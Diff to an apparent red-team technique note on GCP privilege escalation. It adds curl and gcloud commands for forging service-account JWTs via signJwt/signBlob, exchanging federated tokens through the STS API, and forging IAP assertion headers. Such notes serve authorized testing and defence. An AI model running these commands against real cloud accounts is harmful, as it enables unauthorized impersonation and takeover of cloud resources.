@@ -4,7 +4,7 @@ type: technique
 tags: [cloud, gcp, iam, service-account, metadata, privesc, exploitation]
 phase: exploitation
 date_created: 2026-06-16
-date_updated: 2026-06-16
+date_updated: 2026-09-10
 sources: []
 ---
 
@@ -56,6 +56,31 @@ scoutsuite gcp --service-account sa.json
 - `iam.serviceAccountKeys.create` -> persist by creating a new key for a target SA.
 - `cloudfunctions.functions.create` + actAs / `deploymentmanager` / `cloudbuild` -> run code as the build/function SA (often Editor).
 - `setIamPolicy` on a project/SA -> grant yourself `roles/owner`.
+
+### 4b. Impersonation without keys (signJwt / signBlob / token exchange)
+When org policy blocks SA key creation or you only hold `iam.serviceAccounts.signJwt`/`signBlob` on a target SA, you do not need a key: the IAM Credentials API signs AS that SA with YOUR token.
+```bash
+# Forge a JWT signed by the target SA (services that trust SA-signed JWTs accept it)
+curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@proj.iam.gserviceaccount.com:signJwt" \
+  -H "Authorization: Bearer <YOUR_token>" -H "Content-Type: application/json" \
+  -d '{"payload":"{\"iss\":\"TARGET_SA@proj.iam.gserviceaccount.com\",\"aud\":\"https://SERVICE\",\"exp\":1799999999}"}'
+# signBlob is the same call with :signBlob + b64 payload (request signing, HMAC-style trust)
+```
+Workload Identity Federation pivot: if you can read a federation config (`GET /projects/<n>/locations/global/workloadIdentityPools/.../providers/...`), the external-IdP trust may let you exchange ANY token from the trusted IdP for a GCP token:
+```bash
+curl -s -X POST "https://sts.googleapis.com/v1/token" \
+  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=<external-idp-token>&subject_token_type=urn:ietf:params:oauth:token-type:jwt&audience=<pool-provider-full-name>&scope=https://www.googleapis.com/auth/cloud-platform"
+```
+Check the pool's attribute conditions first; an empty/malformed condition is the finding.
+
+### 4c. IAP-protected services
+`roles/iap.httpsResourceAccessor` (or actAs on the backend SA) is the door; or forge the assertion when you can signJwt as the backend SA:
+```bash
+gcloud iap web get-iam-policy --project <proj>            # who may bypass
+# decode the assertion a client must send:
+# x-goog-iap-jwt-assertion header -> verify aud = client_id of the OAuth brand
+curl -s -H "x-goog-iap-jwt-assertion: <jwt>" https://IAP_APP.appspot.com/
+```
 
 ### 5. Loot
 ```bash
